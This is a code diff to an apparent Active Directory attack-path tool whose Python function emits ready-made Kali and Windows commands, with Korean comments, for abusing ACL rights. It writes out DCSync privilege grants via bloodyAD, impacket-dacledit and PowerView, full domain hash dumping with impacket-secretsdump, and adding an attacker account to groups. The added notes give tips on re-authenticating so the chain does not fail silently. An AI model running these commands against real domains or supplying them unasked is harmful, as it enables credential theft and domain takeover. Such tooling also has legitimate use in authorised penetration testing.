@@ -780,8 +780,10 @@ def _hop_cmds(right, ttype, target):
             return [("KALI", "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc")]
         return [
             ("note", "# attacker 에게 DCSync(복제) 권한을 부여한 뒤 전체 해시 덤프"),
-            ("WIN", "Import-Module .\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity 'corp.local' -PrincipalIdentity attacker -Rights DCSync"),
+            ("note", "#  ↳ 앞 단계가 그룹 추가였다면, 새로 인증하는 아래 [KALI] 명령을 쓰는 게 확실"),
+            ("KALI", "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add dcsync attacker"),
             ("KALI", "impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' 'corp.local/attacker:Passw0rd!'"),
+            ("WIN", "Import-Module .\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity 'corp.local' -PrincipalIdentity attacker -Rights DCSync   # ← 새 세션(재접속)에서만 유효"),
             ("KALI", "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"),
         ]
     if ttype == "group":
@@ -790,6 +792,9 @@ def _hop_cmds(right, ttype, target):
             ("WIN", f"Import-Module .\\PowerView.ps1; Add-DomainGroupMember -Identity \"{sam}\" -Members attacker"),
             ("KALI", f"net rpc group addmem \"{sam}\" attacker -U 'corp.local/attacker%Passw0rd!' -S dc01"),
             ("KALI", f"bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember \"{sam}\" attacker"),
+            ("note", "# [!] 그룹 멤버십은 '새 로그온'부터 토큰/Kerberos PAC 에 반영됨."),
+            ("note", "#     -> 다음 단계는 새로 인증하는 [KALI] 도구(impacket/bloodyAD)로 실행하거나,"),
+            ("note", "#        evil-winrm 을 재접속(exit 후 재연결)한 뒤 실행할 것. 안 그러면 조용히 실패."),
         ]
     if ttype == "computer":
         host = sam.split(".")[0] + "$"
